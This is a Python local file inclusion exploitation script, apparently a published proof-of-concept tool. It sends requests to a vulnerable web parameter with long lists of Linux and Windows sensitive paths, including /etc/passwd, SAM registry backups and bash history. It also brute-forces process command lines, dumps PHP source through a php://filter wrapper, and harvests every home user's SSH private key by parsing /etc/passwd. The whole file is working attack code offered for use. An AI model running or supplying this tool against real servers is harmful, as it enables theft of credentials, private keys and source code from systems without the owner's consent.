#!/usr/bin/python3

#################
# lfi enum poc  #
# by 0bfxgh0st* #
#################

import sys
import requests
import re
import base64

print ("lfienum ~by 0bfxgh0st*\n")

def Help():

	print ("Usage python3 lfienum.py <url>\n")
	print ("Options:\n")
	print ("       --pid          Bruteforce 999 process id")
	print ("       --wrapper      (php://filter/convert.base64-encode/resource=)\n")
	print ("Examples:")
	print ('           python3 lfienum.py "http://ghost.server/index.php?page="')
	print ('           python3 lfienum.py "http://ghost.server/index.php?page=" --pid')
	print ('           python3 lfienum.py "http://ghost.server/index.php?page=" --wrapper index.php')

headers = {
    'User-Agent': '--'
}

try:
	url = sys.argv[1]

except IndexError:

	Help()
	sys.exit(1)

linux_lfi_wordlist=['/etc/aliases',
'/etc/anacrontab',
'/etc/apache2/apache2.conf',
'/etc/apache2/httpd.conf',
'/etc/at.allow',
'/etc/at.deny',
'/etc/bashrc',
'/etc/bootptab',
'/etc/chrootUsers',
'/etc/chttp.conf',
'/etc/cron.allow',
'/etc/cron.deny',
'/etc/crontab',
'/etc/cups/cupsd.conf',
'/etc/exports',
'/etc/fstab',
'/etc/ftpaccess',
'/etc/ftpchroot',
'/etc/ftphosts',
'/etc/groups',
'/etc/grub.conf',
'/etc/hosts',
'/etc/hosts.allow',
'/etc/hosts.deny',
'/etc/httpd/access.conf',
'/etc/httpd/conf/httpd.conf',
'/etc/httpd/httpd.conf',
'/etc/httpd/logs/access_log',
'/etc/httpd/logs/access.log',
'/etc/httpd/logs/error_log',
'/etc/httpd/logs/error.log',
'/etc/httpd/php.ini',
'/etc/httpd/srm.conf',
'/etc/inetd.conf',
'/etc/inittab',
'/etc/issue',
'/etc/lighttpd.conf',
'/etc/lilo.conf',
'/etc/logrotate.d/ftp',
'/etc/logrotate.d/proftpd',
'/etc/logrotate.d/vsftpd.log',
'/etc/lsb-release',
'/etc/motd',
'/etc/modules.conf',
'/etc/motd',
'/etc/mtab',
'/etc/my.cnf',
'/etc/my.conf',
'/etc/mysql/my.cnf',
'/etc/network/interfaces',
'/etc/networks',
'/etc/npasswd',
'/etc/passwd',
'/etc/php4.4/fcgi/php.ini',
'/etc/php4/apache2/php.ini',
'/etc/php4/apache/php.ini',
'/etc/php4/cgi/php.ini',
'/etc/php4/apache2/php.ini',
'/etc/php5/apache2/php.ini',
'/etc/php5/apache/php.ini',
'/etc/php/apache2/php.ini',
'/etc/php/apache/php.ini',
'/etc/php/cgi/php.ini',
'/etc/php.ini',
'/etc/php/php4/php.ini',
'/etc/php/php.ini',
'/etc/printcap',
'/etc/profile',
'/etc/proftp.conf',
'/etc/proftpd/proftpd.conf',
'/etc/pure-ftpd.conf',
'/etc/pureftpd.passwd',
'/etc/pureftpd.pdb',
'/etc/pure-ftpd/pure-ftpd.conf',
'/etc/pure-ftpd/pure-ftpd.pdb',
'/etc/pure-ftpd/putreftpd.pdb',
'/etc/redhat-release',
'/etc/resolv.conf',
'/etc/samba/smb.conf',
'/etc/snmpd.conf',
'/etc/ssh/ssh_config',
'/etc/ssh/sshd_config',
'/etc/ssh/ssh_host_dsa_key',
'/etc/ssh/ssh_host_dsa_key.pub',
'/etc/ssh/ssh_host_key',
'/etc/ssh/ssh_host_key.pub',
'/etc/sysconfig/network',
'/etc/syslog.conf',
'/etc/termcap',
'/etc/vhcs2/proftpd/proftpd.conf',
'/etc/vsftpd.chroot_list',
'/etc/vsftpd.conf',
'/etc/vsftpd/vsftpd.conf',
'/etc/wu-ftpd/ftpaccess',
'/etc/wu-ftpd/ftphosts',
'/etc/wu-ftpd/ftpusers',
'/logs/pure-ftpd.log',
'/logs/security_debug_log',
'/logs/security_log',
'/opt/lampp/etc/httpd.conf',
'/opt/xampp/etc/php.ini',
'/proc/cpuinfo',
'/proc/filesystems',
'/proc/interrupts',
'/proc/ioports',
'/proc/meminfo',
'/proc/modules',
'/proc/mounts',
'/proc/stat',
'/proc/swaps',
'/proc/version',
'/proc/self/net/arp',
'/root/anaconda-ks.cfg',
'/usr/etc/pure-ftpd.conf',
'/usr/lib/php.ini',
'/usr/lib/php/php.ini',
'/usr/local/apache/conf/modsec.conf',
'/usr/local/apache/conf/php.ini',
'/usr/local/apache/log',
'/usr/local/apache/logs',
'/usr/local/apache/logs/access_log',
'/usr/local/apache/logs/access.log',
'/usr/local/apache/audit_log',
'/usr/local/apache/error_log',
'/usr/local/apache/error.log',
'/usr/local/cpanel/logs',
'/usr/local/cpanel/logs/access_log',
'/usr/local/cpanel/logs/error_log',
'/usr/local/cpanel/logs/license_log',
'/usr/local/cpanel/logs/login_log',
'/usr/local/cpanel/logs/stats_log',
'/usr/local/etc/httpd/logs/access_log',
'/usr/local/etc/httpd/logs/error_log',
'/usr/local/etc/php.ini',
'/usr/local/etc/pure-ftpd.conf',
'/usr/local/etc/pureftpd.pdb',
'/usr/local/lib/php.ini',
'/usr/local/php4/httpd.conf',
'/usr/local/php4/httpd.conf.php',
'/usr/local/php4/lib/php.ini',
'/usr/local/php5/httpd.conf',
'/usr/local/php5/httpd.conf.php',
'/usr/local/php5/lib/php.ini',
'/usr/local/php/httpd.conf',
'/usr/local/php/httpd.conf.ini',
'/usr/local/php/lib/php.ini',
'/usr/local/pureftpd/etc/pure-ftpd.conf',
'/usr/local/pureftpd/etc/pureftpd.pdn',
'/usr/local/pureftpd/sbin/pure-config.pl',
'/usr/local/www/logs/httpd_log',
'/usr/local/Zend/etc/php.ini',
'/usr/sbin/pure-config.pl',
'/var/adm/log/xferlog',
'/var/apache2/config.inc',
'/var/apache/logs/access_log',
'/var/apache/logs/error_log',
'/var/cpanel/cpanel.config',
'/var/lib/mysql/my.cnf',
'/var/lib/mysql/mysql/user.MYD',
'/var/local/www/conf/php.ini',
'/var/log/apache2/access_log',
'/var/log/apache2/access.log',
'/var/log/apache2/error_log',
'/var/log/apache2/error.log',
'/var/log/apache/access_log',
'/var/log/apache/access.log',
'/var/log/apache/error_log',
'/var/log/apache/error.log',
'/var/log/apache-ssl/access.log',
'/var/log/apache-ssl/error.log',
'/var/log/auth.log',
'/var/log/boot',
'/var/htmp',
'/var/log/chttp.log',
'/var/log/cups/error.log',
'/var/log/daemon.log',
'/var/log/debug',
'/var/log/dmesg',
'/var/log/dpkg.log',
'/var/log/exim_mainlog',
'/var/log/exim/mainlog',
'/var/log/exim_paniclog',
'/var/log/exim.paniclog',
'/var/log/exim_rejectlog',
'/var/log/exim/rejectlog',
'/var/log/faillog',
'/var/log/ftplog',
'/var/log/ftp-proxy',
'/var/log/ftp-proxy/ftp-proxy.log',
'/var/log/httpd/access_log',
'/var/log/httpd/access.log',
'/var/log/httpd/error_log',
'/var/log/httpd/error.log',
'/var/log/httpsd/ssl.access_log',
'/var/log/httpsd/ssl_log',
'/var/log/kern.log',
'/var/log/lastlog',
'/var/log/lighttpd/access.log',
'/var/log/lighttpd/error.log',
'/var/log/lighttpd/lighttpd.access.log',
'/var/log/lighttpd/lighttpd.error.log',
'/var/log/mail.info',
'/var/log/mail.log',
'/var/log/maillog',
'/var/log/mail.warn',
'/var/log/message',
'/var/log/messages',
'/var/log/mysqlderror.log',
'/var/log/mysql.log',
'/var/log/mysql/mysql-bin.log',
'/var/log/mysql/mysql.log',
'/var/log/mysql/mysql-slow.log',
'/var/log/proftpd',
'/var/log/pureftpd.log',
'/var/log/pure-ftpd/pure-ftpd.log',
'/var/log/secure',
'/var/log/vsftpd.log',
'/var/log/wtmp',
'/var/log/xferlog',
'/var/log/yum.log',
'/var/mysql.log',
'/var/run/utmp',
'/var/spool/cron/crontabs/root',
'/var/webmin/miniserv.log',
'/var/www/log/access_log',
'/var/www/log/error_log',
'/var/www/logs/access_log',
'/var/www/logs/error_log',
'/var/www/logs/access.log',
'/var/www/logs/error.log',
'~/.atfp_history',
'~/.bash_history',
'~/.bash_logout',
'~/.bash_profile',
'~/.bashrc',
'~/.gtkrc',
'~/.login',
'~/.logout',
'~/.mysql_history',
'~/.nano_history',
'~/.php_history',
'~/.profile',
'~/.ssh/authorized_keys',
'~/.ssh/id_dsa',
'~/.ssh/id_dsa.pub',
'~/.ssh/id_rsa',
'~/.ssh/id_rsa.pub',
'~/.ssh/identity',
'~/.ssh/identity.pub',
'~/.viminfo',
'~/.wm_style',
'~/.Xdefaults',
'~/.xinitrc',
'~/.Xresources',
'~/.xsession']

windows_lfi_wordlist=['C:/Users/Administrator/NTUser.dat',
'C:/Documents and Settings/Administrator/NTUser.dat',
'C:/apache/logs/access.log',
'C:/apache/logs/error.log',
'C:/apache/php/php.ini',
'C:/boot.ini',
'C:/inetpub/wwwroot/global.asa',
'C:/MySQL/data/hostname.err',
'C:/MySQL/data/mysql.err',
'C:/MySQL/data/mysql.log',
'C:/MySQL/my.cnf',
'C:/MySQL/my.ini',
'C:/php4/php.ini',
'C:/php5/php.ini',
'C:/php/php.ini',
'C:/Program Files/Apache Group/Apache2/conf/httpd.conf',
'C:/Program Files/Apache Group/Apache/conf/httpd.conf',
'C:/Program Files/Apache Group/Apache/logs/access.log',
'C:/Program Files/Apache Group/Apache/logs/error.log',
'C:/Program Files/FileZilla Server/FileZilla Server.xml',
'C:/Program Files/MySQL/data/hostname.err',
'C:/Program Files/MySQL/data/mysql-bin.log',
'C:/Program Files/MySQL/data/mysql.err',
'C:/Program Files/MySQL/data/mysql.log',
'C:/Program Files/MySQL/my.ini',
'C:/Program Files/MySQL/my.cnf',
'C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err',
'C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log ',
'C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err',
'C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log',
'C:/Program Files/MySQL/MySQL Server 5.0/my.cnf',
'C:/Program Files/MySQL/MySQL Server 5.0/my.ini',
'C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf',
'C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf',
'C:/Program Files (x86)/Apache Group/Apache/conf/access.log',
'C:/Program Files (x86)/Apache Group/Apache/conf/error.log',
'C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml',
'C:/Program Files (x86)/xampp/apache/conf/httpd.conf',
'C:/WINDOWS/php.ini',
'C:/WINDOWS/Repair/SAM',
'C:/Windows/repair/system',
'C:/Windows/repair/software',
'C:/Windows/repair/security',
'C:/WINDOWS/System32/drivers/etc/hosts',
'C:/Windows/win.ini',
'C:/WINNT/php.ini',
'C:/WINNT/win.ini',
'C:/xampp/apache/bin/php.ini',
'C:/xampp/apache/logs/access.log',
'C:/xampp/apache/logs/error.log',
'C:/Windows/Panther/Unattend/Unattended.xml',
'C:/Windows/Panther/Unattended.xml',
'C:/Windows/debug/NetSetup.log',
'C:/Windows/system32/config/AppEvent.Evt',
'C:/Windows/system32/config/SecEvent.Evt',
'C:/Windows/system32/config/default.sav',
'C:/Windows/system32/config/security.sav',
'C:/Windows/system32/config/software.sav',
'C:/Windows/system32/config/system.sav',
'C:/Windows/system32/config/regback/default',
'C:/Windows/system32/config/regback/sam',
'C:/Windows/system32/config/regback/security',
'C:/Windows/system32/config/regback/system',
'C:/Windows/system32/config/regback/software',
'C:/Program Files/MySQL/MySQL Server 5.1/my.ini',
'C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml',
'C:/Windows/System32/inetsrv/config/applicationHost.config',
'C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log',
'C:/Program Files/Microsoft SQL Server/MSSQL.1/Template Data/master.mdf',
'C:/Program Files/Microsoft SQL Server/MSSQL10.SQLEXPRESS/Template Data/master.mdf',
'C:/Program Files/Microsoft SQL Server/MSSQL11.SQLEXPRESS/Template Data/master.mdf',
'C:/Program Files/Microsoft SQL Server/MSSQL12.SQLEXPRESS/Template Data/master.mdf',
'C:/Program Files/Microsoft SQL Server/MSSQL13.SQLEXPRESS/Template Data/master.mdf',
'C:/Program Files/Microsoft SQL Server/MSSQL14.SQLEXPRESS/Template Data/master.mdf']

def LinEnum():

	for possible_lfi_file in linux_lfi_wordlist:
		resp = requests.get(url + possible_lfi_file, verify=True, headers=headers)

		if resp.status_code == 200:
			content = resp.text
			clean_content = re.sub('<[^<]+?>', '', content)
			print ("[\033[1;32m" + url + possible_lfi_file + "\033[0m]")
			print(clean_content)

def WinEnum():
	## function not tested
	for possible_lfi_file in windows_lfi_wordlist:
		resp = requests.get(url + possible_lfi_file, verify=True, headers=headers)

		if resp.status_code == 200:

			content = resp.text
			clean_content = re.sub('<[^<]+?>', '', content)
			print ("[\033[1;32m" + url + possible_lfi_file + "\033[0m]")
			print(clean_content)

def PID():

	print ("Bruteforcing 0-999 PIDS (please ignore junk data)")
	pid_count=1000
	for pid in range(pid_count):
		resp = requests.get(url + '/proc/' + str(pid) + '/cmdline', verify=True, headers=headers)

		if resp.status_code == 200:
			content = resp.text

			clean_content = re.sub('<[^<]+?>', '', content)
			print ( "\033[1;32mPID " + str(pid) + ":\033[0m " + clean_content.strip("\n"))

def Wrapper():

	resp = requests.get(url + 'php://filter/convert.base64-encode/resource=' + sys.argv[3], verify=True, headers=headers)
	content = resp.text
	clean_content = re.sub('<[^<]+?>', '', content)
	print (clean_content.strip("\n"))
	print( "\n" + base64.b64decode(clean_content).decode('utf-8'))

def ID_RSA():
	# PoC Function
        resp = requests.get(url + '/etc/passwd')
        cleanresponse = resp.text

        for fetch_users in cleanresponse.split('\n'):
                if ':/home/' in fetch_users:
                        fetch_id_rsa = requests.get(url + '/home/' + fetch_users.split(":")[0].strip() + '/.ssh/id_rsa')

                        if fetch_id_rsa.status_code == 200:

                                print ('\n\033[1;33m[SSH ID_RSA KEY]\033[0m\n' + fetch_users.split(":")[0].strip() + ' key ' + 'from ' + url + '/home/' + fetch_users.split(":")[0].strip() + '/.ssh/id_rsa\n')
                                print (fetch_id_rsa.text)

# Args handlers
if len(sys.argv) == 2:

	try:
     	   	WinEnum()
	except:
		sys.exit(1)
	try:
		LinEnum()
		ID_RSA()
	except:
		sys.exit(1)

try:
	if sys.argv[2] == "--pid":

		PID()

except IndexError:

	sys.exit(1)

try:

	if sys.argv[2] == '--wrapper':

		Wrapper()

except IndexError:

	print ("wrapper argument usage example:")
	print ("python3 lfienum.py http://ghost.server/index.php?page= --wrapper index.php")
	sys.exit(1)
